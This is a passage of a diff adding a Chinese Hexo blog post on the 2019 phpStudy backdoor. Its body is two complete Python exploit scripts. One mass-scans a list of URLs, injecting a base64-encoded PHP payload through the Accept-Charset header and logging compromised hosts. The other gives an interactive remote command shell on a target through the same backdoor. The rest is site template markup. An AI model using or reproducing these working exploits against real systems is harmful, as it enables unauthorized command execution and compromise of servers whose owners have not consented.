&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;,</span><br><span class="line">    &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9&apos;,</span><br><span class="line">    &apos;accept-charset&apos;: payload,</span><br><span class="line">    &apos;Accept-Encoding&apos;: &apos;gzip,deflate&apos;,</span><br><span class="line">    &apos;Connection&apos;: &apos;close&apos;,</span><br><span class="line">&#125;</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url=url+&apos;/index.php&apos;, headers=headers, verify=False,timeout=30)</span><br><span class="line">        if &quot;qing&quot; in r.text:</span><br><span class="line">            print (&apos;[ + ] BackDoor successful: &apos;+url+&apos;===============[ + ]\n&apos;)</span><br><span class="line">            with open(&apos;success.txt&apos;,&apos;a&apos;) as f:</span><br><span class="line">                    f.write(url+&apos;\n&apos;)</span><br><span class="line">        else:</span><br><span class="line">            print (&apos;[ - ] BackDoor failed: &apos;+url+&apos;[ - ]\n&apos;)</span><br><span class="line">    except:</span><br><span class="line">        print (&apos;[ - ] Timeout: &apos;+url+&apos; [ - ]\n&apos;)</span><br><span class="line"></span><br><span class="line"># url = &quot;http://xxx&quot;</span><br><span class="line"># write_shell(url=url,headers=headers)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    with open(&apos;url.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        lines = f.read().splitlines()</span><br><span class="line">        task_pool=threadpool.ThreadPool(5)</span><br><span class="line">        requests=threadpool.makeRequests(write_shell,lines)</span><br><span class="line">    for req in requests:</span><br><span class="line">        task_pool.putRequest(req)</span><br><span class="line">        task_pool.wait() </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#线程队列部分</span><br><span class="line"># th=[]</span><br><span class="line"># th_num=10</span><br><span class="line"># for x in range(th_num):</span><br><span class="line">#         t=threading.Thread(target=write_shell)</span><br><span class="line">#         th.append(t)</span><br><span class="line"># for x in range(th_num):</span><br><span class="line">#         th[x].start()</span><br><span class="line"># for x in range(th_num):</span><br><span class="line">#         th[x].join()</span><br></pre></td></tr></table></figure>
+
+<h4 id="交互shell"><a href="#交互shell" class="headerlink" title="交互shell"></a>交互shell</h4><p><img src="/2019/09/25/phpstudy后门事件/4.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">#-*- encoding:utf-8 -*-</span><br><span class="line"># 卿 博客:https://www.cnblogs.com/-qing-/</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import threadpool</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">print(&quot;======Phpstudy Backdoor Exploit---os-shell============\n&quot;)</span><br><span class="line">print(&quot;===========By  Qing=================\n&quot;)</span><br><span class="line">print(&quot;=====Blog：https://www.cnblogs.com/-qing-/==\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def os_shell(url,headers,payload):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url=url+&apos;/phpinfo.php&apos;,headers=headers,verify=False,timeout=10)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        res = re.findall(&quot;qing(.*?)qing&quot;,r.text,re.S)</span><br><span class="line">        print(&quot;[ + ]===========The Response:==========[ + ]\n&quot;)</span><br><span class="line">        res = &quot;&quot;.join(res)</span><br><span class="line">        print(res)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;[ - ]===========Failed! Timeout...==========[ - ]\n&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    url = input(&quot;input the Url , example:\&quot;http://127.0.0.1/\&quot;\n&quot;)</span><br><span class="line">    payload = input(&quot;input the payload , default:echo system(\&quot;whoami\&quot;);\n&quot;)</span><br><span class="line">    de_payload = &quot;echo \&quot;qing\&quot;;system(\&quot;whoami\&quot;);echo \&quot;qing\&quot;;&quot;</span><br><span class="line">    if payload.strip() == &apos;&apos;:</span><br><span class="line">        payload = de_payload</span><br><span class="line">    payload = &quot;echo \&quot;qing\&quot;;&quot;+payload+&quot;echo \&quot;qing\&quot;;&quot;</span><br><span class="line">    payload = base64.b64encode(payload.encode(&apos;utf-8&apos;))</span><br><span class="line">    payload = str(payload, &apos;utf-8&apos;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">    &apos;Upgrade-Insecure-Requests&apos;: &apos;1&apos;,</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&apos;,</span><br><span class="line">    &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;,</span><br><span class="line">    &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9&apos;,</span><br><span class="line">    &apos;accept-charset&apos;: payload,</span><br><span class="line">    &apos;Accept-Encoding&apos;: &apos;gzip,deflate&apos;,</span><br><span class="line">    &apos;Connection&apos;: &apos;close&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    os_shell(url=url,headers=headers,payload=payload)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+  </div>
+
+  
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/muse.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
